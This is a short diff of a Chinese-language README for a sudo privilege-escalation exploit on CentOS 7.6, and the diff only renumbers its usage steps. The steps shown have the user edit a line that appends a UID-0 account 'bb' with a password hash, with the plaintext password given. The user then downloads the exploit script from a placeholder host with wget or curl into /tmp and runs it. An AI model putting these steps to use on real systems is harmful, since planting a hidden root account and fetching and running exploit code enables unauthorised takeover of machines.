@@ -19,6 +19,6 @@ CentOS Linux release 7.6.1810 (Core)
 1、修改exp_sudo.py中下面这一行
 APPEND_CONTENT = b"bb:$1$84DoAMTs$ruLlLQlSCtlMm9Y17oHPn1:0:0:gg:/root:/bin/bash\n";
 此处的用户名/密码：bb/shenlan1，可在CentOS7.6中创建用户后拷贝到此处替换密码
-wget -O /tmp/exp_sudo.py http://xx.xx.xx.xx:8000/exp_sudo.py 或者 curl -o /tmp/exp_sudo.py http://xx.xx.xx.xx:8000/exp_sudo.py
-python /tmp/exp_sudo.py
+2、wget -O /tmp/exp_sudo.py http://xx.xx.xx.xx:8000/exp_sudo.py 或者 curl -o /tmp/exp_sudo.py http://xx.xx.xx.xx:8000/exp_sudo.py
+3、python /tmp/exp_sudo.py
 ```
